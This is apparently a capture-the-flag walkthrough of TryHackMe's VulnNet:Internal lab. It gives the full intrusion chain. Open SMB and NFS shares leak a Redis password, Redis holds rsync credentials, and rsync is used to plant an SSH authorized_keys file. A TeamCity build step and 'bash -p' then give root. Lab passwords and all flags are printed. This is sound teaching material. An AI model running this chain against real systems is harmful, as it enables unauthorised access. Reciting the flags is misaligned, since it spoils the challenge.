# VulnNet Write Up


## Port Scanning

Today I am going to solve TryHackMe VulnNet:Internal , so lets begin

First scan all the open ports in our machine ,

~~~~PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37778/udp   mountd
|   100005  1,2,3      43571/udp6  mountd
|   100005  1,2,3      51065/tcp6  mountd
|   100005  1,2,3      53031/tcp   mountd
|   100021  1,3,4      36247/tcp   nlockmgr
|   100021  1,3,4      38022/udp   nlockmgr
|   100021  1,3,4      38809/tcp6  nlockmgr
|   100021  1,3,4      43829/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
6379/tcp  open  redis       syn-ack Redis key-value store
54753/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel~~~~

~~~~~~~~

## Enummeration

### Samba

Let us begin our enummeration with Samba , using *smbclient*

~~┌──(sage23㉿kali)-[~/Desktop/VulnNet:Internal]
└─$ smbclient -L 10.10.10.230    
Password for [WORKGROUP\sage23]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            
    
I have left the password space empty so it means that we can access it without any password .

We can see shares directory is accessible through Samba , So we will try to login through smbclient 

~~~~┌──(sage23㉿kali)-[~/Desktop/VulnNet:Internal]
└─$ smbclient //10.10.10.230/shares
Password for [WORKGROUP\sage23]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> 
~~~~

We have successfully login through smbclient , now we will try to get all files all files accessible to us 

~~~~Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021

		11309648 blocks of size 1024. 3276888 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021

		11309648 blocks of size 1024. 3276888 blocks available
smb: \temp\> get services.txt 
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> cd data
smb: \data\> ls 
  .                                   D        0  Tue Feb  2 14:57:33 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  data.txt                            N       48  Tue Feb  2 14:51:18 2021
  business-req.txt                    N      190  Tue Feb  2 14:57:33 2021
get
		11309648 blocks of size 1024. 3276888 blocks available
smb: \data\> get 
business-req.txt  data.txt          
smb: \data\> get 
business-req.txt  data.txt          
smb: \data\> get data.txt
getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> get business-req.txt 
getting file \data\business-req.txt of size 190 as business-req.txt (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> 

~~~~

On opening services.txt we get our first flag that is 
#### *THM{0a09d51e488f5fa105d8d866a497440a}*
 
other files does not contain any useful info.


### NFS 

Since their is nfs port running on machine so we can try to mount it on our device.

~~~~┌──(root㉿kali)-[/home/sage23/Desktop/VulnNet:Internal]
└─# showmount -e 10.10.10.230             
Export list for 10.10.10.230:
/opt/conf *
                                                            
└─# mkdir nfs    

└─# mount -t nfs 10.10.10.230:/opt/conf nfs
~~~~

Now lets dig into our nfs dir

~~~~└─# tree
.
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg
~~~~

On viewing the files we get a file redis.conf in redis

that shows,

requirepass "B65Hx562F@ggAZ@F"

if you remember redis is open on port 6379

Lets try to connect with it 

~~┌──(root㉿kali)-[/home/…/Desktop/VulnNet:Internal/nfs/redis]
└─#  redis-cli -h 10.10.10.230 -p 6379 -a B65Hx562F@ggAZ@F 
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.10.230:6379> KEYS *
1) "int"
2) "marketlist"
3) "internal flag"
4) "authlist"
5) "tmp"
(0.93s)
10.10.10.230:6379> ~~


lets try to get the "internal flag"

~~~~10.10.10.230:6379> get "internal flag"

"THM{ff8e518addbbddb74531a724236a8221}"
~~~~~~~~~~~~

On inspecting authlist key i got an encrypted text 

"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

above text is base64 encoded that is 
"Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v"

This gives us hint that we should try to to connect with rsync


### Rsync

We can sync our dir with that on server by useing following cmd.

~~~~┌──(root㉿kali)-[/home/…/Desktop/VulnNet:Internal/nfs/redis]
└─# cd /root
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~]
└─# ls    
files
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~]
└─# cd files                  
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files]
└─# ls 
sys-internal
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files]
└─# cd sys-internal 
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files/sys-internal]
└─# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files/sys-internal]
└─# cat user.txt 
~~~~


Our Third flag is "*THM{da7c20696831f253e0afaca8b83c07ab}*"



## ssh-keygen

since we have sync our directories with machine we can try to login in machine by creating ssh login credentials.

We know that public key of ssh login is save in .ssh/authorized_keys.
We can create our own ssh key and send it to server by the name of authorized_keys .
and after use private key to login in server.

~~~~┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id
Your public key has been saved in id.pub
The key fingerprint is:
SHA256:Jr3ovfwnV63IuZgX3/lJ7toV6rZaEVXZRspWhPEHAE0 root@kali
The key's randomart image is:
+---[RSA 3072]----+
|          .+E.o*O|
|            ..o*o|
|             .+.o|
|       .     .. .|
|      . S    . o |
|       + .  . + o|
|      . .  . O +o|
|     . o  .oX.*.+|
|      . +o+*+=+=o|
+----[SHA256]-----+
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# ls -la
total 20
drwxrwxr-x  2 sage23 sage23 4096 Jun 16 19:52 .
drwxr-xr-x 18 sage23 sage23 4096 Jun 16 19:51 ..
-rw-------  1 root   root   2590 Jun 16 19:52 id
-rw-r--r--  1 root   root    563 Jun 16 19:52 id.pub
-rwxrwxrwx  1 root   root   2590 Jun 16 00:57 .id_rsa
                                                                                                                                                                                                                                                                                                                                                                
┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# mv id.pub authorized_keys              
                                                                                                                                                                                                                                              
┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# ls -la
total 20
drwxrwxr-x  2 sage23 sage23 4096 Jun 16 19:53 .
drwxr-xr-x 18 sage23 sage23 4096 Jun 16 19:51 ..
-rwxrwxrwx  1 root   root    563 Jun 16 19:52 authorized_keys
-rw-------  1 root   root   2590 Jun 16 19:52 id
-rwxrwxrwx  1 root   root   2590 Jun 16 00:57 .id_rsa
┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# rsync -ahv --no-o --no-g ~/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@10.10.10.230/files/sys-internal/.ssh/authorized_keys
Password: 
sending incremental file list
authorized_keys

sent 99 bytes  received 41 bytes  3.84 bytes/sec
total size is 563  speedup is 4.02

~~~~

Lets login in machine using our private key


ssh -i id sys-internal@10.10.10.230

    
We are finally in server .


## Root Privillage Esclation

After searching in server I found TeamCity dir in first dir , In which I found TeamCity-readme.txt in which it was specified that teamcity is running on local host http://127.0.0.1:8111

we can forward the port by,

~~~~                                         
┌──(root㉿kali)-[~/files/sys-internal/.ssh]
└─# ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.10.80.118
~~~~

on going to webpage , we can see 

![](https://i.imgur.com/pzvRVeO.png)


we can see that we have to login as adminstrator , on reading link given we can see,

we need token to login
lets go and search for token in Teamcity dir by *grep *
we get ,
![](https://i.imgur.com/BoBLMLV.png)

lets try to login with token as written,

![](https://i.imgur.com/THs6Gcy.png)

lets try to create project .

![](https://i.imgur.com/ilGRAQd.png)

lets create create build , now  go to buid step and config it similar to what i have done , and click run .


![](https://i.imgur.com/B6kHTaX.png)


now . lets go back to terminal and run */bin/bash -p*

![](https://i.imgur.com/viULXtP.png)

all we have to do is go to root and open root.txt 

*THM{e8996faea46df09dba5676dd271c60bd}*.
